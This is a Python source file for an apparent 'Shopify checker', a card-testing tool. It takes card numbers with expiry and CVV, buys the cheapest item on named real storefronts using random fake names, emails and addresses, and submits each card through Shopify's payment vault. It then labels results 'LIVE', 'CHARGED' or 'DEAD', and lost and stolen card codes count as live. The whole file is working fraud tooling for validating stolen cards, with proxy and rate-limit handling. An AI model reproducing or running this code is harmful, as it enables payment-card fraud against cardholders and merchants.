import asyncio, aiohttp, json, re, time, random, string, hashlib, uuid, logging
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

SHOPIFY_SITES = [
    "biggerfive.myshopify.com",
    "www.glowrecipe.com",
    "bychari.myshopify.com",
    "colourpop.com",
    "boatcarpetbuys.myshopify.com",
]

UA = "Mozilla/5.0 (compatible; ShopifyChecker/1.0)"

LIVE_CODES = {
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "try_again_later", "not_permitted",
    "generic_decline", "transaction_not_allowed",
}

def _extract_between(text, start, end):
    try:
        return text[text.index(start)+len(start):text.index(end, text.index(start)+len(start))]
    except ValueError:
        return None

def _random_name():
    f = ["John","James","Robert","Michael","William","David"]
    l = ["Smith","Johnson","Williams","Brown","Jones","Taylor"]
    return random.choice(f), random.choice(l)

def _random_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=8))}@gmail.com"

def _random_address():
    return random.choice([
        {'street':'1600 Pennsylvania Ave NW','city':'Washington','state':'DC','zip':'20500','phone':'2025551234'},
        {'street':'350 Fifth Ave','city':'New York','state':'NY','zip':'10118','phone':'2125551234'},
        {'street':'233 S Wacker Dr','city':'Chicago','state':'IL','zip':'60606','phone':'3125551234'},
        {'street':'6060 Center Dr','city':'Los Angeles','state':'CA','zip':'90045','phone':'3235551234'},
    ])

def _parse_products(data):
    products = data.get('products', [])
    if not products: return None
    best = None
    min_p = float('inf')
    for p in products:
        for v in p.get('variants', []):
            if not v.get('available', False): continue
            try:
                price = float(str(v.get('price', '0')).replace(',', ''))
                if 0 < price < min_p:
                    min_p = price
                    best = {'price': f"{price:.2f}", 'variant_id': str(v['id'])}
            except: continue
    if not best:
        for p in products:
            for v in p.get('variants', []):
                try:
                    best = {'price': str(v.get('price', '1.00')), 'variant_id': str(v['id'])}
                    break
                except: continue
            if best: break
    return best

PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},queueToken:$queueToken}){__typename result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}...on PendingTerms{__typename}}delivery{__typename ...on PendingTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name}}}}}}}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage}}}}'

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'

async def shopify_check(cc, mm, yy, cvv, site=None, proxy=None):
    """Full Shopify checkout - returns real bank results"""
    start = time.time()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    
    if len(yy) == 2: year_full = f"20{yy}"
    else: year_full = yy
    
    # Check expired
    try:
        from datetime import datetime
        exp = datetime(int(year_full), int(mm), 1)
        now = datetime.now()
        if exp.year < now.year or (exp.year == now.year and exp.month < now.month):
            return {"verdict":"DECLINED_DEAD","message":"Card Expired","code":"expired_card","amount":"N/A","gate":"Shopify","site":site or "N/A","time":f"{round(time.time()-start,1)}s"}
    except: pass
    
    sites = [site] if site else SHOPIFY_SITES.copy()
    if not site: random.shuffle(sites)
    
    for s in sites[:3]:
        await asyncio.sleep(0.5)  # Delay to avoid rate limit
        s = s.replace("https://","").replace("http://","").rstrip("/")
        try:
            result = await _check_site(cc, mm, yy, cvv, year_full, s, proxy, None, start)
            if result: return result
        except Exception as e:
            logger.info(f"Site {s} error: {str(e)[:60]}")
            continue
    
    return {"verdict":"UNTESTED","message":"All sites failed","code":"all_failed","amount":"N/A","gate":"Shopify","site":"N/A","time":f"{round(time.time()-start,1)}s"}

async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
    base = f"https://{domain}"
    
    # Create fresh session for each site
    session_kw = {"timeout": aiohttp.ClientTimeout(total=20), "connector": aiohttp.TCPConnector(ssl=False, limit=10, force_close=True)}
    if proxy: session_kw["proxy"] = proxy
    
    async with aiohttp.ClientSession(**session_kw) as session:
        # Step 1: Product
        product = None
        for ep in [f"{base}/products.json?limit=5", f"{base}/collections/all/products.json?limit=5"]:
            try:
                async with session.get(ep, headers={"User-Agent":UA,"Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status == 200:
                        product = _parse_products(await r.json(content_type=None))
                        if product: break
            except: continue
        if not product: return None
        
        # Step 2: Cart
        try:
            async with session.post(f"{base}/cart/add.js", json={"id":int(product['variant_id'])}, headers={"User-Agent":UA,"Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status != 200: return None
        except: return None
        
        # Step 3: Checkout
        try:
            async with session.post(f"{base}/checkout/", headers={"User-Agent":UA,"Accept":"text/html"}, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as r:
                checkout_url = str(r.url)
                text = await r.text()
        except: return None
        
        sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
        if not sst: return None
        
        queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
        stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')
        pmi = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        if not stable_id or not pmi: return None
        
        # Get cart token from /cart.js
        cart_token = ""
        try:
            async with session.get(f"{base}/cart.js", headers={"User-Agent":UA,"Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=5)) as cr:
                if cr.status == 200:
                    cart_data = await cr.json(content_type=None)
                    cart_token = cart_data.get("token", "")
        except: pass
        
        graphql_url = f"{base}/checkouts/unstable/graphql"
        gql_headers = {
            "User-Agent": UA,
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": base,
            "Referer": checkout_url,
            "X-Checkout-One-Session-Token": sst,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": cart_token or stable_id,
        }
        
        first, last = _random_name()
        email = _random_email()
        addr = _random_address()
        addr_block = {"address1":addr['street'],"address2":"","city":addr['city'],"countryCode":"US","postalCode":addr['zip'],"firstName":first,"lastName":last,"zoneCode":addr['state'],"phone":addr['phone'],"company":""}
        
        common = {
            "sessionInput":{"sessionToken":sst}, "queueToken":queue_token,
            "discounts":{"lines":[],"acceptUnexpectedDiscounts":True},
            "merchandise":{"merchandiseLines":[{"stableId":stable_id,"merchandise":{"productVariantReference":{"id":f"gid://shopify/ProductVariantMerchandise/{product['variant_id']}","variantId":f"gid://shopify/ProductVariant/{product['variant_id']}","properties":[],"sellingPlanId":None,"sellingPlanDigest":None}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"any":True},"lineComponentsSource":None,"lineComponents":[]}]},
            "buyerIdentity":{"buyerIdentity":{"presentmentCurrency":"USD","countryCode":"US"},"contactInfoV2":{"emailOrSms":{"value":email,"emailOrSmsChanged":False}},"marketingConsent":[{"email":{"value":email}}],"shopPayOptInPhone":{"countryCode":"US"}},
            "tip":{"tipLines":[]}, "taxes":{"proposedAllocations":None,"proposedTotalAmount":{"value":{"amount":"0","currencyCode":"USD"}},"proposedTotalIncludedAmount":None,"proposedMixedStateTotalAmount":None,"proposedExemptions":[]},
            "note":{"message":None,"customAttributes":[]}, "localizationExtension":{"fields":[]},
            "nonNegotiableTerms":None, "scriptFingerprint":{"signature":None,"signatureUuid":None,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},
            "optionalDuties":{"buyerRefusesDuties":False},
        }
        
        # Step 4: Negotiate shipping
        s1 = dict(common)
        s1["delivery"] = {"deliveryLines":[{"destination":{"partialStreetAddress":addr_block},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},"options":{}},"targetMerchandiseLines":{"any":True},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":True},"destinationChanged":True}],"noDeliveryRequired":[],"useProgressiveRates":False,"prefetchShippingRatesStrategy":None,"supportsSplitShipping":True}
        s1["payment"] = {"totalAmount":{"any":True},"paymentLines":[],"billingAddress":{"streetAddress":addr_block}}
        
        r1 = await _negotiate(session, graphql_url, gql_headers, s1)
        if not r1 or r1.get("__typename") != "NegotiationResultAvailable": return None
        sp = r1.get("sellerProposal", {})
        qt = r1.get("queueToken", queue_token)
        
        # Check if delivery is PendingTerms - need second negotiate
        dl = sp.get("delivery", {})
        if dl.get("__typename") == "PendingTerms":
            print(f"[DEBUG] {domain}: Delivery PendingTerms - re-negotiating", flush=True)
            s1["queueToken"] = qt
            r1 = await _negotiate(session, graphql_url, gql_headers, s1)
            if r1 and r1.get("__typename") == "NegotiationResultAvailable":
                sp = r1.get("sellerProposal", {})
                qt = r1.get("queueToken", qt)
        
        rt = sp.get("runningTotal",{}).get("value",{}).get("amount","0")
        cur = sp.get("runningTotal",{}).get("value",{}).get("currencyCode","USD")
        delivery = ""
        tax = "0"
        try:
            dl = sp.get("delivery",{})
            if dl.get("__typename") == "FilledDeliveryTerms":
                lines = dl.get("deliveryLines",[])
                if lines and lines[0].get("availableDeliveryStrategies",[]):
                    delivery = lines[0]["availableDeliveryStrategies"][0].get("handle","")
                    ship_amt = lines[0]["availableDeliveryStrategies"][0].get("amount",{}).get("value",{}).get("amount","0")
            tx = sp.get("tax",{})
            if tx.get("totalTaxAmount",{}).get("value",{}).get("amount"):
                tax = tx["totalTaxAmount"]["value"]["amount"]
        except Exception as e:
            print(f"[DEBUG] {domain}: Parse seller error: {str(e)[:60]}", flush=True)
        
        print(f"[DEBUG] {domain}: total={rt} delivery={delivery[:20] if delivery else 'NONE'} tax={tax}", flush=True)
        
        if not delivery:
            print(f"[DEBUG] {domain}: No delivery strategy - trying with any", flush=True)
            delivery = "any"  # Fallback: use "any" as delivery strategy
        
        # Step 5: Vault
        try:
            vault_resp = await session.post("https://deposit.us.shopifycs.com/sessions", json={
                "credit_card":{"number":cc,"month":int(mm),"year":int(year_full),"verification_value":cvv,"name":f"{first} {last}"},
                "payment_session_scope":domain
            }, headers={"Content-Type":"application/json","User-Agent":UA,"Origin":"https://checkout.shopifycs.com","Referer":"https://checkout.shopifycs.com/","Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=10))
            vault = await vault_resp.json(content_type=None)
            if "id" not in vault: return None
            payment_token = vault["id"]
        except: return None
        
        # Step 6: Submit
        payment_input = {"totalAmount":{"any":True},"paymentLines":[{"paymentMethod":{"directPaymentMethod":{"paymentMethodIdentifier":pmi,"sessionId":payment_token,"billingAddress":{"streetAddress":addr_block},"cardSource":None}},"amount":{"any":True},"dueAt":None}],"billingAddress":{"streetAddress":addr_block}}
        
        checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
        attempt = f"{cart_token}-{random.random()}" if cart_token else (checkout_token.group(1) if checkout_token else str(uuid.uuid4())[:20])
        
        completion = {"input":{"sessionInput":{"sessionToken":sst},"queueToken":qt,"discounts":{"lines":[],"acceptUnexpectedDiscounts":True},"delivery":{"deliveryLines":[{"destination":{"streetAddress":addr_block},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},"options":{}},"targetMerchandiseLines":{"any":True},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":True},"destinationChanged":True}],"noDeliveryRequired":[],"useProgressiveRates":False,"prefetchShippingRatesStrategy":None,"supportsSplitShipping":True},"merchandise":common["merchandise"],"payment":payment_input,"buyerIdentity":common["buyerIdentity"],"tip":{"tipLines":[]},"taxes":{"proposedAllocations":None,"proposedTotalAmount":{"value":{"amount":tax,"currencyCode":cur}},"proposedTotalIncludedAmount":None,"proposedMixedStateTotalAmount":None,"proposedExemptions":[]},"note":{"message":None,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":None,"scriptFingerprint":{"signature":None,"signatureUuid":None,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":False}},"attemptToken":attempt,"metafields":[],"analytics":{"requestUrl":checkout_url,"pageId":str(uuid.uuid4())}}
        
        # Submit with retry for tax/terms changes
        receipt_id = None
        for _submit_attempt in range(3):
            try:
                async with session.post(graphql_url, json={"query":SUBMIT_QUERY,"variables":completion,"operationName":"SubmitForCompletion"}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    submit_text = await r.text()
                submit_data = json.loads(submit_text).get("data",{}).get("submitForCompletion",{})
            except:
                return None
            
            typename = submit_data.get("__typename","")
            if typename in ("SubmitSuccess","SubmitAlreadyAccepted","SubmittedForCompletion"):
                receipt_id = submit_data.get("receipt",{}).get("id")
                break
            
            if typename == "SubmitRejected":
                errors = submit_data.get("errors",[])
                codes = [e.get("code","") for e in errors]
                print(f"[DEBUG] {domain}: Submit rejected: {codes}", flush=True)
                # Retry on tax/terms/amount changes
                retry_codes = {"TAX_NEW_TAX_MUST_BE_ACCEPTED","WAITING_PENDING_TERMS","PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT","MERCHANDISE_EXPECTED_PRICE_MISMATCH","DELIVERY_DELIVERY_LINE_DETAIL_CHANGED"}
                if any(c in retry_codes for c in codes) and _submit_attempt < 2:
                    # Re-negotiate to get updated amounts
                    s_retry = dict(common)
                    s_retry["queueToken"] = qt
                    s_retry["delivery"] = s1.get("delivery", {})
                    s_retry["payment"] = {"totalAmount":{"any":True},"paymentLines":[],"billingAddress":{"streetAddress":addr_block}}
                    r_retry = await _negotiate(session, graphql_url, gql_headers, s_retry)
                    if r_retry and r_retry.get("__typename") == "NegotiationResultAvailable":
                        sp_retry = r_retry.get("sellerProposal",{})
                        qt = r_retry.get("queueToken", qt)
                        rt = sp_retry.get("runningTotal",{}).get("value",{}).get("amount", rt)
                        cur = sp_retry.get("runningTotal",{}).get("value",{}).get("currencyCode", cur)
                        try:
                            tx = sp_retry.get("tax",{})
                            if tx.get("totalTaxAmount",{}).get("value",{}).get("amount"):
                                tax = tx["totalTaxAmount"]["value"]["amount"]
                            dl = sp_retry.get("delivery",{})
                            if dl.get("__typename") == "FilledDeliveryTerms":
                                lines = dl.get("deliveryLines",[])
                                if lines and lines[0].get("availableDeliveryStrategies",[]):
                                    delivery = lines[0]["availableDeliveryStrategies"][0].get("handle", delivery)
                        except:
                            pass
                        print(f"[DEBUG] {domain}: Retry with total={rt} tax={tax} delivery={delivery[:20]}", flush=True)
                        # Update completion body
                        completion["input"]["queueToken"] = qt
                        completion["input"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = tax
                        completion["input"]["taxes"]["proposedTotalAmount"]["value"]["currencyCode"] = cur
                        payment_input["paymentLines"][0]["amount"] = {"any":True}
                        await asyncio.sleep(0.3)
                        continue
            break
        
        if not receipt_id: return None
        
        # Step 7: Poll
        await asyncio.sleep(0.5)
        poll = {"query":POLL_QUERY,"variables":{"receiptId":receipt_id,"sessionToken":sst},"operationName":"PollForReceipt"}
        try:
            async with session.post(graphql_url, json=poll, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=5)) as r:
                poll_text = await r.text()
        except: return None
        
        # Parse result
        try:
            poll_data = json.loads(poll_text).get("data",{}).get("receipt",{})
            rtype = poll_data.get("__typename","")
            perr = poll_data.get("processingError",{})
            code = perr.get("code","") if perr else ""
            msg = perr.get("messageUntranslated","") if perr else ""
        except:
            rtype = ""; code = ""; msg = ""
        
        elapsed = round(time.time()-start, 1)
        site_url = f"https://{domain}"
        
        if rtype == "ProcessedReceipt" and not code:
            return {"verdict":"APPROVED_CHARGED","message":"CHARGED! Payment successful","code":"charged","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
        if rtype == "ActionRequiredReceipt":
            return {"verdict":"APPROVED_3DS","message":"Card LIVE - 3DS Required","code":"3ds_required","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
        if rtype == "FailedReceipt" or code:
            cl = code.lower()
            if any(k in cl for k in ["insufficient","funds"]):
                return {"verdict":"APPROVED_LIVE","message":"Card LIVE - Insufficient Funds","code":"insufficient_funds","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
            if any(k in cl for k in ["cvc","cvv"]):
                return {"verdict":"APPROVED_LIVE","message":"Card LIVE - Invalid CVV","code":"invalid_cvc","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
            if any(k in cl for k in ["expired"]):
                return {"verdict":"DECLINED_DEAD","message":"Card Expired","code":"expired_card","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
            if any(k in cl for k in ["stolen","lost"]):
                return {"verdict":"DECLINED_DEAD","message":"Card Stolen/Lost","code":code,"amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
            # GENERIC_ERROR = bank declined, Shopify can't map specific code
            real_code = code
            if 'generic_error' in code.lower():
                real_code = 'card_declined'
            return {"verdict":"DECLINED","message":f"Declined - {real_code}","code":real_code,"amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
        
        return {"verdict":"UNTESTED","message":"No response code","code":"no_code","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}

async def _negotiate(session, url, headers, variables):
    for attempt in range(2):
        try:
            async with session.post(url, json={"query":PROPOSAL_QUERY,"variables":variables,"operationName":"Proposal"}, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200: continue
                data = await r.json(content_type=None)
                result = data.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{})
                return result if result else None
        except:
            if attempt == 0: await asyncio.sleep(0.2); continue
            return None
    return None